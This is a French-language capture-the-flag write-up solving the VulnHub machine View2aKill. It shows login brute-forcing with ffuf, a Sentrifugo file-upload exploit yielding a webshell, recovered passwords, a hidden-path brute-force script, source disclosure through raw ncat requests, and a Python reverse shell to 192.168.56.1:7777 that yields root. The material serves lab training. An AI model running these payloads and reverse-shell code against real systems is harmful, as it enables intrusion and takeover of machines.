---
title: "Solution du CTF View2aKill de VulnHub"
tags: [CTF, VulnHub]
---

[View2aKill](https://vulnhub.com/entry/view2akill-1,387/) est un CTF créé par *creosote* qui, comme les précédents, se base sur l'univers *James Bond*. Tout comme les précédents, on doit faire avec différents indices pour avancer.

Ces derniers gagneraient à être plus concis et surtout une des indications est à un moment fausse, car elle ne mentionne pas qu'il faille rajouter des retours à la ligne pour générer des hashes.

En dehors de ces deux points le CTF est plutôt bien fait.

## Zorin OS

Je vais me concentrer pour le moment sur le port 80 :

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp    Postfix smtpd
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-enum: 
|   /robots.txt: Robots file
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /pics/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)''
8191/tcp open  http    PHP cli server 5.5 or later
```

Le fichier `robots.txt` contient les entrées suivantes :

```
User-agent: *
Disallow: /joomla
Disallow: /zorin
Disallow: /dev
Disallow: /defense
```

Une énumération ne remonte rien de plus intéressant :

```
200       23l      127w     2369c http://192.168.56.193/dev/
200       40l      280w     5738c http://192.168.56.193/pics/
403        9l       28w      279c http://192.168.56.193/icons/
403        9l       28w      279c http://192.168.56.193/server-status/
200       11l       22w      194c http://192.168.56.193/
200       16l       26w      307c http://192.168.56.193/joomla/
200       38l       63w      510c http://192.168.56.193/defense/
```

Sur la section `defense` je trouve ce message :

```html
<h2>
    Web Defense Prototype
</h2>
<p>Security devs made a custom app that checks for any unusual files in the apache web directory.
Not really sure how it works and if it's actually secure.
Just let them know before any changes are made in web dirs. </p>
</html>
```

Et dans la partie `dev` on trouve une archive tgz :

```console
$ tar zvtf e_bkup.tar.gz 
-rw-r--r-- root/root       795 2019-10-20 20:31 New_Employee_Onboarding_Chuck.rtf
-rw-r--r-- root/root       302 2019-10-20 20:03 onboarding_email_template.rtf
-rw-r--r-- root/root       467 2019-10-20 20:43 Stop_Storing_Passwords.rtf
-rw-r--r-- root/root       165 2019-10-20 20:08 note_to_mail_admins.txt
```

J'ai extrait le contenu des RTF et fichiers textes. L'un parle de mot de passe stocké dans un fichier texte :

> All, I know you're close with Max, but you can't keep storing your credentials in txt files on your desktop!
> 
> We already have had complaints of the apps inactivity auto logout feature, but 5 seconds is high enough in my professional opinion.
> 
> Simply copy pasting credentials in the login fields is bad practice, even if password requirments are set to 32 characters minimun !    
> 
> Scarpine - Head of Security - CSO CIO

A priori ce message fait juste mention du RTF servant de template onboarding :

> Yo, wassup computer geeks! I was told by design to upload a few example emails for you nerds to work with in prep for what they called "email web gooey platform".

Celui-ci est ans doute le plus intéressant : on a un nom d'utilisateur et des indices pour le mot de passe :

> Greeting Chuck, We welcome you to the team!
> 
> Please login to our HR mgmt portal(which we spoke of) and fill out your profile and Details.
> 
> Make sure to enter in the descrption of your CISSP under Training & Certificate Details since you mentioned you have it.
> 
> I will be checking that section often as I need to fill out related paperwork.
> 
> Login username: chuck@localhost.com and password is the lowercase word/txt from the cool R&D video I showed you with the remote detonator + the transmit frequency of an HID proxcard reader - so password format example: facility007.
> 
> Sorry for the rigmarole, the Security folks will kill me if I send passwords in clear text.
> 
> We make some really neat tech here at Zorin, glad you joined the team Chuck Lee! 

Et pour finir le template RTF :

> Greeting EMPLOYEE, We welcome you to the team!
> 
> Please login to our HR mgmt portaland fill out your profile and Details.
> 
> Login username: USERNAME@localhost.com and password is: PASSWORD.
> 
> INSERT ORG SPECIFIC PHRASE, glad you joined the team EMPLOYEE! 

Ensuite il y a toute la partie dans le dossier `zorin` mais surtout `/zorin/hr.html` :

> ## This page still needs the design signed off as this will be our most visited page once the "plan" has executed...
> 
> In the mean time use **/sentrifugo** for current HR mgmt.
> 
> During this transition period all new users (from now on) will have their sentrifugo passwords automatically set to **toor** so no *real* email address is required for the system to send the initial automatically generated password. Please be patient as the reset to toor may take up to a minute.

Il est mention d'une appli web nommée *Sentrifugo* qui permet de la gestion du personnel et est accessible sur le chemin `/sentrifugo`.

## Louloucoptère

Si on reprend le message à destination de *Chuck* il est mention de la fréquence de transmission d'un lecteur HID.

Sous le dossier `dev` il y a un fichier nommé `HID6005.pdf` (qui provient d'une documentation réelle) et je retrouve l'indication suivante :

```
Transmit Frequency
125 kHz
```

Plus qu'à trouver le fameux mot qu'on voit dans une vidéo. En fait il s'agit de l'image GIF `remote_control.gif` dans le même dossier où l'on peut lire `HELICOPTER` sur un détonateur (extrait d'un film de *James Bond*).

On pouvait aussi bruteforcer une partie du mot de passe (par exemple le mot) mais la plupart des outils comme `ffuf` et `wfuzz` gèrent mal les cookies : sur un formulaire où il faut envoyer les identifiants via POST puis suivre une redirection pour voir le résultat ils ne retransmettent pas le cookie obtenu sur la première réponse.

Par chance ici l'appli web ne définit pas un nouveau cookie à chaque tentative, on peut donc fixer un cookie pour toute l'attaque brute force :

```console
$ ffuf -X POST -u http://192.168.56.193/sentrifugo/index.php/index/loginpopupsave \
  -d 'username=chuck%40localhost.com&password=FUZZ125' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words-lowercase.txt \
  -r -H 'Cookie: PHPSESSID=37cuh43794lud5gm9jrajmtel4' -fw 1974

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.193/sentrifugo/index.php/index/loginpopupsave
 :: Wordlist         : FUZZ: fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words-lowercase.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: PHPSESSID=37cuh43794lud5gm9jrajmtel4
 :: Data             : username=chuck%40localhost.com&password=FUZZ125
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1974
________________________________________________

helicopter              [Status: 200, Size: 66009, Words: 8823, Lines: 1360]
help1                   [Status: 200, Size: 65997, Words: 8823, Lines: 1360]
haendlerbereich         [Status: 200, Size: 65997, Words: 8823, Lines: 1360]
help_center             [Status: 200, Size: 65997, Words: 8823, Lines: 1360]
her                     [Status: 200, Size: 65997, Words: 8823, Lines: 1360]
haendlersuche           [Status: 200, Size: 65997, Words: 8823, Lines: 1360]
haha                    [Status: 200, Size: 65997, Words: 8823, Lines: 1360]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

En revanche il faut stopper l'attaque dès que ça réussi sans quoi les requêtes sont effectuées en authentifiées et nous seront noyés sous l'output.

Quand on recherche *Sentrifugo* sur *exploit-db* on trouve deux exploits écrits par l'auteur du CTF.

Le premier concerne une faille XSS. Il faut aller dans le profil de l'utilisateur pour gérer ses certifications et placer un tag HTML `script`. Le message qu'on a vu plus tôt est un indice que l'exploitation est simulée :

> Make sure to enter in the descrption of your CISSP under Training & Certificate Details since you mentioned you have it.
> 
> I will be checking that section often as I need to fill out related paperwork.

L'exploit est assez compliqué, car il faut disposer de différentes valeurs qui doivent être valides et on ne voit pas où est défini le mot de passe dans l'exploit.

[Sentrifugo 3.2 - Persistent Cross-Site Scripting - PHP webapps Exploit](https://www.exploit-db.com/exploits/47324)

J'ai pu vérifier qu'un browser simulait la présence d'une autre personne :

```http
GET /index.js HTTP/1.1
Accept: */*
Referer: http://192.168.56.193/sentrifugo/index.php/trainingandcertificationdetails/viewpopup/id/1/unitId/3/popup/1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: 192.168.56.1
```

En revanche tenter d'obtenir le `document.cookie` semble échouer. Ce dernier doit être en `httpOnly`.

Plus tard, je me suis penché plus en détails sur cette exploitation et effectivement le formulaire faillible demande beaucoup d'infos et la définition du mot de passe semble se faire sur une étape ultérieure.

Dans un cas d'exploitation réelle, ce serait plus intelligent d'utiliser la faille XSS pour modifier l'adresse email de l'utilisateur par la nôtre puis forcer la réinitialisation du mot de passe.

L'autre vulnérabilité est plus simple : on a une page permettant l'upload de fichiers, mais les vérifications sont faites côté client.

[Sentrifugo 3.2 - File Upload Restriction Bypass - PHP webapps Exploit](https://www.exploit-db.com/exploits/47323)

J'ai réécrit l'exploit pour qu'il donne un shell semi-interactif : [exploits/devloop-cve-2019-15813.py](https://github.com/devl00p/exploits/blob/main/devloop-cve-2019-15813.py)

```console
$ python3 sentrifugo.py http://192.168.56.193/sentrifugo/ chuck@localhost.com helicopter125
== Sentrifugo 3.2 Arbitrary Upload exploit ==
Login successful
Backdoor uploaded at http://192.168.56.193/sentrifugo/public/uploads/expense_receipt_temp/1683455408_3_shell.php. Communicating with webshell
Enter 'quit' to exit
cmd$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cmd$ uname -a
Linux view 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

J'ai récupéré la config SQL du *Sentrifugo* :

```console
www-data@view:/var/www/html/sentrifugo$ cat public/db_constants.php 
<?php
                   defined('SENTRIFUGO_HOST') || define('SENTRIFUGO_HOST','127.0.0.1');
                   defined('SENTRIFUGO_USERNAME') || define('SENTRIFUGO_USERNAME','sentrifugo');
                   defined('SENTRIFUGO_PASSWORD') || define('SENTRIFUGO_PASSWORD','toor');
                   defined('SENTRIFUGO_DBNAME') || define('SENTRIFUGO_DBNAME','sentrifugo');
```

La plupart des hashes présents en base étaient incassables sauf le dernier correspondant à `toor`.

```
mysql> select id, emailaddress, isactive, emppassword from main_users;
+----+----------------------+----------+----------------------------------+
| id | emailaddress         | isactive | emppassword                      |
+----+----------------------+----------+----------------------------------+
|  1 | admin@example.com    |        1 | 3f1d184476f900cef354d24febcdd448 |
|  2 | bug@localhost.com    |        1 | 6818e7d8358317948aa16b0d58fbedd1 |
|  3 | chuck@localhost.com  |        1 | 9cd91704a01db534aad288958979cc47 |
|  4 | dennis@localhost.com |        1 | 1802c79d8e1acb9302116cca0e476c97 |
|  5 | wayne@localhost.com  |        0 | 7b24afc8bc80e548d66c4e7ff72171c5 |
+----+----------------------+----------+----------------------------------+
5 rows in set (0.00 sec)
```

Il n'a toutefois rien donné.

Dans un fichier de log, on voit une référence au précédent message *Security devs made a custom app that checks for any unusual files* :

```console
www-data@view:/var/www/html$ alias ls="ls -alh --color"
www-data@view:/var/www/html$ ls defense/
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Oct 26  2019 .
drwxr-xr-x 8 root     root     4.0K Oct 27  2019 ..
-rwxrwxr-x 1 www-data www-data   79 Oct 27  2019 app.log
-rwxr-xr-x 1 www-data www-data  510 Oct 26  2019 index.html
www-data@view:/var/www/html$ less defense/app.log 
www-data@view:/var/www/html$ cat defense/app.log 
Malware Found and Deleted! -- ok.phtml
Malware Found and Deleted! -- test.php5
```

## echo -n motherfucker

On verra ça plus tard. Pour le moment on va se concentrer sur cette note laissée à *Max* :

```console
www-data@view:/var/www/html$ find /home/ -name "*.txt" -ls 2> /dev/null 
   399258      4 -rw-r--r--   1 scarpine scarpine      553 Oct 26  2019 /home/max/note.txt
www-data@view:/var/www/html$ cat /home/max/note.txt
Max,

The electronic controller web application you asked for is almost done. Located on port 8191 this app will allow you to execute your plan from a remote location.

The remote trigger is located in a hidden web directory that only you should know - I verbally confirmed it with you.
If you do not recall, the directory is based on an algorithm:  SHA1(lowercase alpha(a-z) + "view" + digit(0-9) + digit(0-9)).

Example: SHA1(rview86) = 044c64c6964998ccb62e8facda730e8307f28de6 = http://<ip>:8191/044c64c6964998ccb62e8facda730e8307f28de6/

- Scarpine
```

Cette note va de pair avec le `todo` qu'on trouve chez `jenny` :

```console
www-data@view:/var/www/html$ cp /home/jenny/dsktp_backup.zip  /tmp/
www-data@view:/var/www/html$ cd /tmp/
www-data@view:/tmp$ unzip dsktp_backup.zip 
Archive:  dsktp_backup.zip
  inflating: passswords.txt          
  inflating: todo.txt                
www-data@view:/tmp$ cat passswords.txt 
hr mgmt - NO ACCESS ANYMORE
jenny@localhost.com
ThisisAreallYLONGPAssw0rdWHY!!!!

ssh
jenny
!!!sfbay!!!
www-data@view:/tmp$ cat todo.txt
TODO

-Give feedback to marketing on logo (it currently looks like the banner ouside a cheap Italian reseaurant!!)
        -The Boss likes the original, so I guess we're keeping it :/
-Push final script to /home/max/aView.py
        -Waiting on devs and mechanical eng. to finalize programs (no way for QA to test this one! Yikes!)
-Verify James Bond is MI6. They may be on to us.
        -Security says they are trying to infltrate our servers, so they pushed out a new password policy. 
        -Head of Security said this policy will solve all security related problems after I confronted him about it.
-Make a habit of deleting pointless emails.
-Migrate needed desktop items to Linux server.
```

Donc il semble que le `phpcli` qui écoute sur le port 8191 et qu'on peut voir tourner en tant que root dans les process possède un dossier caché contenant un script qui va exécuter le fichier `/home/max/aView.py`.

Avec le compte de _Jenny_ (obtenu grace aux identifiants qu'elle a laissés dans le fichier zip) on peut éditer le script en question.

```console
jenny@view:~$ cat /home/max/aView.py
#!/usr/bin/python
# 
# executed from php app add final wrapper/scirpt here
print "waiting on engineers to tweak final code"
jenny@view:~$ id
uid=1007(jenny) gid=1007(jenny) groups=1007(jenny)
jenny@view:~$ ls -al /home/max/aView.py
-rwxrwx--- 1 max jenny 124 Oct 26  2019 /home/max/aView.py
jenny@view:~$ ps aux | grep php
root      1042  0.2  0.7 273112  7112 ?        S    May06   4:12 php -S 0.0.0.0:8191
jenny     3917  0.0  0.0  13136   988 pts/0    S+   19:07   0:00 grep --color=auto php
```

Toutefois, ce script n'a pas la permission `o+x`. Faut-il obtenir le compte `max` aussi ? J'ai laissé tourné `pspy` qui a révélé l'exécution de différents scripts, mais rien qui ne m'avance davantage.

```
2023/05/07 19:40:00 CMD: UID=0    PID=1025   | /bin/bash /root/ctf-scripts/svc.sh 
2023/05/07 19:40:00 CMD: UID=0    PID=10106  | phantomjs /opt/casperjs/bin/bootstrap.js --casper-path=/opt/casperjs --cli /root/ctf-scripts/ok.js 
2023/05/07 19:40:00 CMD: UID=0    PID=10103  | /bin/sh -c /opt/casperjs/bin/casperjs /root/ctf-scripts/ok.js 
2023/05/07 19:40:01 CMD: UID=0    PID=10505  | /bin/bash /root/ctf-scripts/sql-script.sh 
2023/05/07 19:40:01 CMD: UID=0    PID=10504  | /bin/bash /root/ctf-scripts/defense.sh 
2023/05/07 19:41:01 CMD: UID=0    PID=10524  | mysql -h localhost -u root -ptoor sentrifugo
```

Finalement, j'ai écrit le script suivant pour bruteforcer les URLs selon l'algorithme de _Scarpine_ :

```python
import string
from hashlib import sha1

import requests

session = requests.Session()

for letter in string.ascii_lowercase:
    for int1 in range(10):
        for int2 in range(10):
            word = letter + "view" + str(int1) + str(int2) + "\n"
            h = sha1(word.encode()).hexdigest()
            response = session.get("http://192.168.56.193:8191/" + h + "/")
            if len(response.text) != 167:
                print(len(response.text), word.strip(), h)
```

La bonne blague (ou pas) c'est qu'il fallait rajouter un retour à la ligne aux mots avant de les hasher, ce qui n'était pas indiqué dans le message.

Je suppose que l'auteur du CTF a utilisé la commande `echo` sans l'option `-n` sans comprendre son erreur.

```console
$ python3 brute_path.py 
147 aview10 13fabf2bcd385cf87939748490f6a96955212567
133 aview17 d0fa319a11ef644862edf51b9177b9d62a1e6650
119 aview22 ece8236b92964611c75c759bb8c2297e3b962903
815 aview24 7f98ca7ba1484c66bf09627f931448053ae6b55a
119 aview26 fa05b73405e2996c69ad78ed1fa0f24b9da965ac
119 aview41 af92fb801e526655686899ae8341b9e7cfa21ea0
147 bview11 f871c18649e03d2e9cd7414b95cde578f23dba8d
119 bview77 0f3c6dc226621deac4d0a66e0f60785d923fc282
119 cview29 03388bdd6c0ba6a112b0f0d3aca2f3775be0a007
133 cview91 ef1cacc0f3b5aea1a0d56c5df4263580e7b23570
147 dview00 e57019d9886a12e8c27d9d3f4e46fac9603e8bc2
119 eview57 de5eb20114e281e2e514a64d98187d6f30c3c9b4
115 fview31 e7642454c8c6047fd883a859580a0723657fcf45
119 fview32 ad3029ea9d74ebcbde60ec9abaf95ac6eed95490
147 hview42 5a96f2b44b310535334d2b99258db5ea3eadd448
119 kview11 dd0cdfeb376f8e96d2325724eb000588c8cf70f5
147 lview01 d7297045329f04a3bb4b35e629407343868820d4
119 oview99 72fd79c962996b32fc4b0a2a0c5c1b6b1aa860d4
147 rview07 8eb11aa78f52090f8c32f81797e561d7fbd29fd7
119 sview29 f174b138d930be79ab383669319aecbdde70af6a
133 wview77 2cfc36dfe3e7f20faa2ad9bc2091c25387844adf
119 zview99 7c7b00a0a30137eaac46b32aaec2f9668d6a10d5
```

Une exploration manuelle de ces paths permet d'en trouver un avec un gros bouton pour l'exécution.

Je peux exploiter la faille du `phpcli` pour divulguer le code PHP :

```console
$ echo -e "GET /7f98ca7ba1484c66bf09627f931448053ae6b55a/run.php HTTP/1.1\r\nHost: pd.research\r\n\r\nGET /xyz.xyz HTTP/1.1\r\n\r\n" | ncat 192.168.56.193 8191 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.193:8191.
HTTP/1.1 200 OK
Host: pd.research
Connection: close
Content-Type: application/octet-stream
Content-Length: 153

<html>
<?php
$out = shell_exec('/usr/bin/python /home/max/aView.py');
echo $out;
?>

<br><br><br><br>
<img src="view11.gif" alt="almost there">

</html>
Ncat: 111 bytes sent, 271 bytes received in 0.09 seconds.
```

Il s'agit bien de l'exécution qu'on attendait et pas besoin ici des permissions `o+x`. J'ai donc modifié le script Python comme ceci :

```python
import socket
import subprocess
import os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.1", 7777))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/bash", "-i"])
```

Et j'obtenais mon shell :

```console
$ ncat -l -p 7777 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 192.168.56.193.
Ncat: Connection from 192.168.56.193:47768.
bash: cannot set terminal process group (1025): Inappropriate ioctl for device
bash: no job control in this shell
root@view:~/destroy/7f98ca7ba1484c66bf09627f931448053ae6b55a# id
id
uid=0(root) gid=0(root) groups=0(root)
root@view:~/destroy/7f98ca7ba1484c66bf09627f931448053ae6b55a# cd /root
cd /root
root@view:~# ls
ls
ctf-scripts
Desktop
destroy
flag
root@view:~# ls flag
ls flag
files
index.php
run_me_for_flag.sh
root@view:~# ./flag/run_me_for_flag.sh
./flag/run_me_for_flag.sh
-------------------------------
-------------------------------
Go here:   http://<ip>:8007
-------------------------------
-------------------------------
```

## Making of

Le système se basait sur différentes entrées crontab pour fonctionner :

```console
root@view:~/ctf-scripts# crontab -l
crontab -l
# 
# m h  dom mon dow   command
##################out of scope for ctf#####################
# simulate basic IPS
* * * * * /root/ctf-scripts/defense.sh

# simulate HR user getting CSRF'ed
*/2 * * * * /opt/casperjs/bin/casperjs /root/ctf-scripts/ok.js

# replace new sentrifugo users pass to toor 
*/1 * * * * /root/ctf-scripts/sql-script.sh

# replace localhost w/ actual ip in ok.js on each boot
@reboot sleep 90; /root/ctf-scripts/ip-rep.sh

# delete casper logs
5 * * * * > /var/mail/root
```

Le script `defense.sh` était le suivant :

```bash
#!/bin/bash
cd /var/www/html/sentrifugo/public/uploads/policydocs
new=$(ls)

for i in $new; do
 #dates=$(ls --full-time $i |rev |cut -d ' ' -f4 |rev |tr -d '-')
 if [[ "$i" == *.php* ]]; then
    echo "Malware Found and Deleted! -- $i" >> /var/www/html/defense/app.log
    rm -rf $i 
 elif [[ "$i" == *.elf* ]]; then
    echo "Malware Found and Deleted! -- $i" >> /var/www/html/defense/app.log
    rm -rf $i
 elif [[ "$i" == *.py* ]]; then
    echo "Malware Found and Deleted! -- $i" >> /var/www/html/defense/app.log
    rm -rf $i
 elif [[ "$i" == *.inc* ]]; then
    echo "Malware Found and Deleted! -- $i" >> /var/www/html/defense/app.log
    rm -rf $i
 elif [[ "$i" == *phtml* ]]; then
    echo "Malware Found and Deleted! -- $i" >> /var/www/html/defense/app.log
    rm -rf $i
 fi
done
```

On pourrait penser que ce dernier est vulnérable à une faille d'injection bash via la création de fichiers contenant des caractères spécifiques (dans le dossier `/var/www/html/sentrifugo/public/uploads/policydocs`) mais ce n'est pas le cas, bash gérant correctement les données récupérées.

Le script émulant le compte privilégié sur le *Sentrifugo* était le suivant : 

```js
var casper = require('casper').create({   
    verbose: true, 
    logLevel: 'debug',
    pageSettings: {
         loadImages:  false,         // The WebPage instance used by Casper will
         loadPlugins: false,         // use these settings
         userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4'
    }
});

// print out all the messages in the headless browser context
casper.on('remote.message', function(msg) {
    this.echo('remote message caught: ' + msg);
});

// print out all the messages in the headless browser context
casper.on("page.error", function(msg, trace) {
    this.echo("Page Error: " + msg, "ERROR");
});

var url = 'http://192.168.56.193/sentrifugo/index.php/index';

casper.start(url, function() {
   console.log("page loaded");
   this.fill('form#idfrm', { 
        username: 'bug@localhost.com', 
        password:  'mayday1010'
    }, true);
});

casper.thenEvaluate(function(){
   console.log("Page Title " + document.title);
});

casper.then(function(){
    casper.wait(5000, function(){console.log("asd")});
});

casper.thenOpen('http://192.168.56.193/sentrifugo/index.php/trainingandcertificationdetails/viewpopup/id/1/unitId/3/popup/1', function() { 
     console.log("locaded popup cert dir");
});

casper.thenEvaluate(function(){
   console.log("Page Title " + document.title);
});

casper.run();
```

Comme dit plus tôt ça fonctionne, mais l'exploitation est compliquée. La VM étant en host-only (sans accès internet) je n'ai pas cherché à passer par la réinitialisation du mot de passe.
